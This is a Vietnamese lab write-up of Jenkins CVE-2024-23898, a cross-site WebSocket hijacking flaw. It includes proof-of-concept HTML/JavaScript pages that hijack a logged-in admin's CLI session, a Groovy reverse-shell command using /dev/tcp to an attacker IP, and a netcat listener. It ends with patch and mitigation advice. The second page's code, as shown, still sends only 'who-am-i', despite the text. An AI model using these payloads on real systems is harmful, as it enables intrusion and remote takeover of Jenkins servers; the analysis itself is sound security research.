# Phân tích lỗ hổng CVE-2024-23898 - CSWSH Jenkins

--- 

## Tổng quan về Jenkins, CLI Jenkins và WebSocket trong Jenkins

- Jenkins là một CI/CD server (Continuous Integration / Continuous Delivery). Nó giúp tự động hóa build, test, deploy, và tích hợp pipeline DevOps. Admin/dev có thể quản lý Jenkins qua: Web UI (trình duyệt), REST API, CLI (Command Line Interface), JNLP / remoting (agents).

- CLI Jenkins được tạo ra với mục đích: cho automation & admin thao tác Jenkins từ shell/script (create-job, build, list-jobs, etc.).

- Jenkins từ v2.217 và LTS 2.222.1 giới thiệu thêm WebSocket mode cho CLI. Trước đây CLI thường kết nối qua HTTP (remoting) hoặc SSH. Nhưng nhiều môi trường enterprise chỉ cho phép WebSocket traffic xuyên qua proxy/firewall (ví dụ các reverse proxy chặn raw TCP/SSH nhưng cho Upgrade: websocket).

  &rarr; Jenkins thêm CLI qua WebSocket để tiện dụng hơn.

## Cross-site WebSocket hijacking là gì?

- CSWSH là khi attacker lợi dụng giao thức WebSocket để thực hiện một kiểu CSRF (cross-site request forgery) trên bước handshake. Thay vì chỉ gửi một request đơn hướng như CSRF truyền thống, attacker mở một kênh hai chiều (WebSocket) và tận dụng session của nạn nhân để gửi/nhận tin nhắn với server như thể là nạn nhân.

- WebSocket bắt đầu bằng một HTTP handshake (Upgrade request). Nếu server dựa duy nhất vào cookie để xác thực (ví dụ JSESSIONID) và không kiểm tra thêm (Origin, CSRF token, signature), thì một trang web khác (attacker) có thể mở handshake đó từ trình duyệt của nạn nhân.

  &rarr; **Cross-site WebSocket hijacking (CSWSH) = CSRF trên bước WebSocket handshake.**

- Dưới đây là một ví dụ về một WS handshake mà rất có dấu hiệu vulnerable: Request upgrade chỉ chứa cookie làm thông tin session — không có CSRF token, không có HMAC signature, không có param nonce. Server không dựa vào bất kỳ giá trị không đoán trước nào khác để xác thực request trước khi chấp nhận upgrade:

  ```http
  GET /chat HTTP/1.1
  Host: normal-website.com
  Sec-WebSocket-Version: 13
  Sec-WebSocket-Key: <random>
  Connection: keep-alive, Upgrade
  Cookie: session=KOsEJ...
  Upgrade: websocket
  ```
  
## Phân tích CVE-2024-23898 trong Jenkins 

### Mô tả: 

- CVE-2024-23898 là một lỗ hổng nguy hiểm (score NVD: 8.8 HIGH) trong các phiên bản 2.217 → 2.441 (và LTS 2.222.1 → 2.426.2) của Jenkins, thuộc dạng kiểu lỗ hổng Cross-site WebSocket hijacking (CSWSH). Bản chất lỗ hổng này là do Jenkins có một giao diện dòng lệnh (command line interface - CLI) gọi là `jenkins-cli` và hoạt động trên một endpoint là `/cli`, thông qua giao thức WebSocket.

- Vấn đề chính nằm ở chỗ, tại các phiên bản này Jenkins không thực hiện validate header `Orgin` cho các request WebSocket handshake kết nối đến endpoint `/cli`. Một yếu tố phụ khác là Jenkins không đặt explicit SameSite attribute cho session cookies, nói nôm na là `SameSite` là thuộc tính của cookie quy định khi nào trình duyệt được phép gửi cookie đi kèm với các request từ trang khác (cross-site) và khi cookie không có thuộc tính `SameSite` được set, thì trình duyệt quyết định hành vi mặc định.
  
- Hậu quả một trang web bên ngoài có thể mở một kết nối WebSocket tới `/cli` và nếu trình duyệt gửi cookie phiên (và/hoặc remember cookie) kết hợp với server không validate header Origin thì server sẽ coi đó như là một kết nối của người dùng đã đăng nhập. Và ta có thể lợi dụng kết nối này để khai thác.

  <img width="1919" height="800" alt="image" src="https://github.com/user-attachments/assets/bffad2e0-0764-4b19-bb0c-dd36ac1e566d" />

### Phân tích và demo:

- Bản chất gốc rễ của lỗ hổng là nằm ở giao thức WebSocket tại endpoint `/cli`, do đó ta cần phân tích request WebSocket handshake của Jenkins tại endpoint này.

- Đầu tiên giả dụ, ta đăng nhập với tài khoản Jenkins `admin` (password có thể lấy bằng cách truy cập lệnh `sudo docker exec -it jenkins_ssh bash -c "cat /var/jenkins_home/secrets/initialAdminPassword 2>/dev/null || true"` trên terminal nếu build Jenkins bằng docker):

  <img width="1919" height="849" alt="Screenshot 2025-10-04 185929" src="https://github.com/user-attachments/assets/645d1c3e-cb72-4242-af7a-d54cc65d0e65" />

  (optional tính năng `Keep me signed in/Remember me` khi đăng nhập).

- Để có thể phân tích, ta cần dùng Jenkins CLI qua WebSocket để bắt request và xem WebSocket interactions của nó như thế nào tại endpoint `/cli`. Để tạo kết nối WebSocket ta có thể sử dụng `jenkins-cli.jar` (đại loại là file JAR chính thức của Jenkins cung cấp Command Line Interface (CLI) cho Jenkins). Nó là kiểu client Java, và Jenkins sử dụng nó để cho phép chạy lệnh từ terminal. Tuy nhiên để Burp Suite có thể bắt request WebSocket handshake và các messages ta cần ép JVM dùng proxy và xoá `nonProxyHosts` (buộc Java không exempt localhost, nên nó sẽ gửi request qua proxy). Em dùng port 8081 cho Burp Suite:

  ```bash
  java \
  -Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=8081 \
  -Dhttps.proxyHost=127.0.0.1 -Dhttps.proxyPort=8081 \
  -Dhttp.nonProxyHosts="" \
  -Dhttps.nonProxyHosts="" \
  -jar jenkins-cli.jar \
  -s http://127.0.0.1:8080 \
  -auth admin:APITOKEN \
  -webSocket help
  ```

  Trong đó `-s http://127.0.0.1:8080` là Jenkins URL đang chạy, `-auth user:APITOKEN` = authentication (lấy token trên UI Jenkins: User avatar → Configure → API Token → Generate / Copy). `help` là lệnh thực hiện (help    là lệnh xem full list commands của Jenkins)

  <img width="1914" height="837" alt="image" src="https://github.com/user-attachments/assets/4a21c563-17cf-4fa8-baf0-2f8f5ba5bbcd" />

  &rarr; Websocket interactions trong WebSocket history trong Burp:

  <img width="1917" height="804" alt="image" src="https://github.com/user-attachments/assets/0dfb02c8-3b22-4065-aada-d87236d004c2" />

  &rarr; Request WebSocket mà Burp bắt được:

  <img width="1919" height="803" alt="image" src="https://github.com/user-attachments/assets/ef30e5d6-3339-42cc-913f-7fad8f4ed9fe" />

  Kết quả thấy được `GET /cli/ws HTTP/1.1` → đây là WebSocket upgrade request tới endpoint CLI (/cli/ws). Ngoài ra, ta cũng thấy dược rằng Jenkins phiên bản này đang cho phép kết nối      giao tiếp Websockets bằng cách sử dụng `ws` thay vì `wss` &rarr; đây là chỗ chứa nguy cơ lỗ hổng rất cao.

  Điểm đặc biệt ở đây là handshake được chấp nhận (HTTP/1.1 101 Switching Protocols) dù không thấy token CSRF hay biện pháp chống CSWSH rõ ràng nào khác.

  Ngoài ra request có sử dụng header Authorization chứa Basic auth (base64), để gửi _session/auth credential_ trong handshake. Tuy nhiên, ta có thể thử test bypass bằng cách gửi request   với session cookie (và/hoặc remember me cookie) mà ta sẽ thực hiện cross-site   với nạn nhân vì đây là request HTTP GET Upgrade — browser sẽ gửi cookie tự động cho cùng domain (trong trường hợp server không validate origin).

  Do đó ta sẽ test request WebSocket handshake này của Jenkins là server có thực hiện validate header `Origin` trong request và từ đó check có bị cross-site hijacking không (CSWSH)?

  Thực hiện tạo một web page local HTML nhúng JS chạy trên port 5000 với mục đích thực hiện lừa nạn nhân click truy cập trang dẫn, source code như sau:

  ```html
  from flask import Flask, render_template_string

  app = Flask(__name__)
  
  @app.route('/')
  def index():
      # Define the HTML page with embedded JavaScript
      html_content = """
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>WebSocket Test</title>
          <script>
              // Set the WebSocket URL and origin
              const url = "ws://localhost:8080/cli/ws";
  
              // Create the first WebSocket connection
              const ws1 = new WebSocket(url);
              
              ws1.binaryType = 'arraybuffer';
              
              ws1.onopen = function() {
                  console.log("WebSocket Connected");
                  const command = new TextEncoder().encode("who-am-i");
                  console.log(command);
  
                  // Define the start and end frames
                  const start = new Uint8Array([0x00, 0x00, 0x08]);
                  const end = new Uint8Array([0x02, 0x00, 0x05, 0x55, 0x54, 0x46, 0x2d, 0x38, 0x01, 0x00, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53]);
  
                  // Combine the frames
                  const commandFrame = new Uint8Array(start.length + command.length + end.length);
                  commandFrame.set(start);
                  commandFrame.set(command, start.length);
                  commandFrame.set(end, start.length + command.length);
  
                  // Send the frames
                  ws1.send(commandFrame);
                  console.log("Command sent (ws1)");
  
                  ws1.send(new Uint8Array([0x03]));  		
  		            let i = 0;
                  ws1.onmessage = async function(event) {
                      try {
                    			console.log('onmessage received, typeof:', typeof event.data,
                    				    'is ArrayBuffer?', event.data instanceof ArrayBuffer,
                    				    'is Blob?', event.data instanceof Blob);
                    
                    			let arrayBuffer;
                    
                    			if (event.data instanceof ArrayBuffer) {
                    			    arrayBuffer = event.data;
                    			} else if (event.data instanceof Blob) {
                    			    arrayBuffer = await event.data.arrayBuffer();
                    			} else if (typeof event.data === 'string') {
                    			    console.log(`Message ${i} (text): ${event.data}`);
                    			    i += 1;
                    			    return;
                    			} else {
                    			    console.warn('Unknown message type received:', event.data);
                    			    return;
                    			}
                    
                    			const decoder = new TextDecoder('utf-8');
                    			const decodedMessage = decoder.decode(arrayBuffer);
                    			console.log(`Message ${i}: ${decodedMessage}`);
                    			i += 1;
  
                      } catch (err) {
                    			  console.error('Error decoding message:', err);
                      }
                  };
  
                  ws1.onclose = function() {
                      console.log("First WebSocket closed");
                  };
              };
          </script>
      </head>
      <body>
          <h1>WebSocket Connection Test</h1>
          <p>Open your browser's console to see WebSocket interactions.</p>
      </body>
      </html>
      """
      # Render the HTML content as the response
      return render_template_string(html_content)
    
  if __name__ == '__main__':
      app.run(debug=True, host='0.0.0.0', port=5000)
  ```

  Khi nạn nhân thực hiện mở trang web độc hại mà trong khi vẫn đang đăng nhập ở hệ thống Jenkins, thì từ browser của nạn nhân sẽ chạy mã JS trên trang web độc hại và thực hiện tạo một phiên kết nối WebSocket tự động       `const ws1 = new WebSocket(url)` tới `ws://localhost:8080/cli/ws`, tức là endpoint `/cli/ws` của Jenkins. Cùng với trong phiên WebSocket này là gửi câu lệnh `who-am-i` được mã hóa sang bytes (UTF-8) với các quá         trình biến đổi dưới dạng khung nhị phân để tạo ra một binary message có cấu trúc mà server mong đợi.

  Giả sử, nạn nhân đang truy cập Jenkins và thực hiện mở web page độc của ta như sau:

  <img width="1919" height="799" alt="image" src="https://github.com/user-attachments/assets/372f6c13-98c1-4138-9a0c-c512b4757079" />

  Thực hiện kiểm tra Burp Suite, ta thấy được request WebSocket handshake mà web page độc hại gửi đến cho server Jenkins:

  <img width="1918" height="582" alt="image" src="https://github.com/user-attachments/assets/ac5a0acc-bdb5-4f32-a5be-bbfe4ed55194" />

  &rarr; Server Jenkins phản hổi `101 Switching Protocols` &rarr; quá trình WebSocket handshake trên diễn ra thành công.

  &rarr; Và có thể thấy header `Origin` của request lúc này là: `http://localhost:5000` (tức là URL của trang web độc hại của ta) &rarr; **server không validate header `Orrigin`**

  &rarr; Trong request được gửi có thêm header `Cookie` là _session cookie (cookie phiên đăng nhập hiện tại của nạn nhân) và remember me cookie_ &rarr; Browser của nạn nhân đã tự động gửi cho phiên kết nối WebSocket      này do Jenkins không explicit SamSite attribute như đã đề cập ở trên.

  Ta có thể thấy WebSocket interactions trong WebSocket history, hoặc trong console browser ta sẽ thấy toàn bộ log đã được ghi lại:

  <img width="1919" height="797" alt="image" src="https://github.com/user-attachments/assets/139981bf-7752-49ea-9d44-d5124e35e2a6" />

  &rarr; Toàn bộ các messages do server trả về từ câu lệnh `who-am-i`. Và điều này sẽ rất nguy hiểm nếu attacker override console.log (v.v.) trong client JS và gửi (fetch/XHR/...) về endpoint trên server của họ.

  &rarr; Kết luận với request có `cookie session` lụm được của nạn nhân và server không kiểm tra `Origin` hay yêu cầu thêm auth trong WS handshake, trang cross-site có thể mở socket       thay nạn nhân và gửi các câu lệnh CLI tương tác với service nội bộ.

  &rarr; **Tồn tại lỗ hổng CSWSH tại endpoint `/cli/ws/` sử dụng giao thức WebSocket của Jenkins.**

  ### Video demo: [▶️ Xem demo check CSWSH](./demo-cve-2024-23898/demo1.mp4)

### Lợi dụng CSWSH để RCE

- Một điểm đặc biệt trên hệ thống Jenkins, có một chức năng: Script Console (trên endpoint `/script`) là giao diện web dành cho admin (Manage → Script Console) để nhập và chạy Groovy trực tiếp trong JVM của Jenkins controller (Jenkins server).

- Nó chạy code trong ngữ cảnh process Jenkins (full JVM access), tức là có thể truy cập filesystem, network, runtime internals — rất mạnh, gần như RCE nếu ai đó có quyền admin. Chỉ admin (Overall/Administer) mặc định có quyền mở và chạy console này.

  <img width="1919" height="796" alt="image" src="https://github.com/user-attachments/assets/7dee94ef-119e-4c0a-8e54-3f51c1469cce" />

- Mặt khác, giao diện CLI của Jenkins cung cấp nhiều command (list-jobs, build, get-job, install-plugin, v.v.) — một số lệnh đọc, một số mutate, và một vài lệnh cho phép chạy _Groovy (groovy, groovysh)_ nếu user có quyền tương ứng (giả sử ở đây là tài khoản admin).

- Do đó mà ta có thể lợi dụng lỗ hổng CSWSH trên endpoint `/cli` để gửi request WS, có thể gửi lệnh CLI kiểu _groovy_ và chạy code trong JVM giống như Script Console &rarr; Đạt được RCE trên controller (Jenkins server).

- Để exploit và đạt được RCE ta cần tạo và gửi được lệnh CLI Groovy sau tới được server Jenkins:

  ```bash
  ['bash', '-c', 'bash -i >& /dev/tcp/<our_ip>/<port_num_listener> 0>&1'].execute()
  ```

  &rarr; Lệnh nêu trên là **reverse shell**: nó nối stdin/stdout/stderr shell qua socket TCP tới máy tấn công của ta → interactive groovysh remote shell.

- Tương tự tạo một trang web độc hại với mã JS được sửa đổi so với trước như sau:

  ```html
  from flask import Flask, render_template_string

  app = Flask(__name__)
  
  @app.route('/')
  def index():
      # Define the HTML page with embedded JavaScript
      html_content = """
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>WebSocket Test</title>
          <script>
              // Set the WebSocket URL and origin
              const url = "ws://localhost:8080/cli/ws"; 
              const originHeader = "http://localhost:8080"; 
  
              const ws1 = new WebSocket(url);
              
              ws1.binaryType = 'arraybuffer';
              
              ws1.onopen = function() {
                  console.log("First WebSocket Connected");
  
                  const command = new TextEncoder().encode("who-am-i");
                  console.log(command);
  
                  // Define the start and end frames
                  const start = new Uint8Array([0x00, 0x00, 0x08]);
                  const end = new Uint8Array([0x02, 0x00, 0x05, 0x55, 0x54, 0x46, 0x2d, 0x38, 0x01, 0x00, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53]);
  
                  // Combine the frames
                  const commandFrame = new Uint8Array(start.length + command.length + end.length);
                  commandFrame.set(start);
                  commandFrame.set(command, start.length);
                  commandFrame.set(end, start.length + command.length);
  
                  // Send the frames
                  ws1.send(commandFrame);
                  console.log("Command sent (ws1)");
  
                  ws1.send(new Uint8Array([0x03]));
                  console.log("Start signal sent (ws1)");
  		
  		let i = 0;
                  ws1.onmessage = async function(event) {
                      try {
  			// Debug: log the type of event.data
  			console.log('onmessage received, typeof:', typeof event.data,
  				    'is ArrayBuffer?', event.data instanceof ArrayBuffer,
  				    'is Blob?', event.data instanceof Blob);
  
  			let arrayBuffer;
  
  			if (event.data instanceof ArrayBuffer) {
  			    arrayBuffer = event.data;
  			} else if (event.data instanceof Blob) {
  			    // convert Blob to ArrayBuffer (async)
  			    arrayBuffer = await event.data.arrayBuffer();
  			} else if (typeof event.data === 'string') {
  			    // It's already text — just print it
  			    console.log(`Message ${i} (text): ${event.data}`);
  			    i += 1;
  			    return;
  			} else {
  			    console.warn('Unknown message type received:', event.data);
  			    return;
  			}
  
  			// Now decode the ArrayBuffer to UTF-8 string
  			const decoder = new TextDecoder('utf-8');
  			const decodedMessage = decoder.decode(arrayBuffer);
  
  			console.log(`Message ${i}: ${decodedMessage}`);
  			i += 1;
  		    } catch (err) {
  			console.error('Error decoding message:', err);
  		    }
                  };
  
                  ws1.onclose = function() {
                      console.log("First WebSocket closed");
                  };
              };
          </script>
      </head>
      <body>
          <h1>WebSocket Connection Test</h1>
          <p>Open your browser's console to see WebSocket interactions.</p>
      </body>
      </html>
      """
      # Render the HTML content as the response
      return render_template_string(html_content)
  
  if __name__ == '__main__':
      app.run(debug=True, host='0.0.0.0', port=5000)
  ```

  Đoạn JS trên là tạo một command_hex, là một frame-packed binary command chứa chuỗi lệnh CLI Groovy cùng control bytes để server CLI hiểu đó là một command, trong đó sẽ thực hiện embed địa chỉ IP máy tấn công của ta (ở đây là 192.168.21.129) và sau đó có phần chứa port (port: 9999) để có thể callback khi reverse shell.

- Tương tự như cơ chế ở trên, đợi nạn nhân sập bẫy và mở trang web độc hại.

- Trên terminal khởi động **netcat listener** trên port 9999 để lắng nghe:

  ```bash
  nc -lvp 9999
  ```

- Exploit thành công, ta sẽ thấy trong WebSocket history toàn bộ inrteractions về quá trình trên, từ gửi yêu cầu cli `groovysh` và câu lệnh `['bash', '-c', '/bin/bash -c \'bash -i >& /dev/tcp/192.168.21.129/9999 0>&1\''].execute().waitFor()` như hình ảnh bên dưới:

  <img width="1912" height="685" alt="image" src="https://github.com/user-attachments/assets/c1e7ffa3-56c1-4ef8-b165-46e11b3e5cd7" />

  <img width="1919" height="680" alt="image" src="https://github.com/user-attachments/assets/d1952de8-3992-4ab9-9fef-f401440fcab8" />

- Trên console browser ta cũng có thể thấy toàn bộ log về phiên WS này:

  <img width="1919" height="786" alt="Screenshot 2025-10-05 174639" src="https://github.com/user-attachments/assets/be537088-e86a-4948-98fc-6bb567ab61b6" />

- Kiểm tra _netcat_ lắng nghe trên terminal:

  <img width="1681" height="761" alt="image" src="https://github.com/user-attachments/assets/b4c85090-c6ed-417d-980d-3b3985994164" />

  &rarr; Ta đã có một shell tương tác trên controller với quyền root

  &rarr; Reverse shell đã thành công: container (Jenkins) đã mở kết nối TCP tới máy tấn công, spawn bash, và ta đang tương tác trên prompt của root container.
  
  &rarr; **Thành công lợi dụng CSWSH để đạt được RCE trên controller Jenkins.**

- Amazing good jobs.

### Video đemo: [▶️ Xem demo RCE](./demo-cve-2024-23898/demo2.mp4)

### Khắc phục

- Bản vá bổ sung kiểm tra Origin cho endpoint CLI qua WebSocket. Sau khi cập nhật lên:

  - Jenkins 2.442 (regular), LTS 2.426.3 và LTS 2.440.1 sẽ kiểm tra Origin khi có yêu cầu upgrade WebSocket tới /cli.

  - Nếu Origin không hợp lệ thì handshake bị chặn → ngăn CSWSH.
 
- Nếu bản vá gây lỗi có thể tạm vô hiệu hóa cơ chế kiểm tra này bằng cách truyền Java system property sau vào JVM của Jenkins:

  ```bash
  -Dhudson.cli.CLIAction.ALLOW_WEBSOCKET=true
  ```

- Hoặc nếu chưa cập nhật được Jenkins, dùng một trong các biện pháp sau để giảm rủi ro:

  - Disable CLI access (đề xuất): Tắt hoàn toàn truy cập CLI trên instance. Đây là workaround an toàn nhất vì loại bỏ hoàn toàn bề mặt tấn công.
 
  - Chặn WebSocket tại reverse proxy: Nếu Jenkins nằm sau reverse proxy (nghĩa là người dùng truy cập chỉ qua proxy), cấu hình proxy để không nâng cấp (no Upgrade) các request tới /cli → proxy sẽ trả lỗi thay vì chuyển tiếp WebSocket handshake.

  

  



  

  


  
  

  
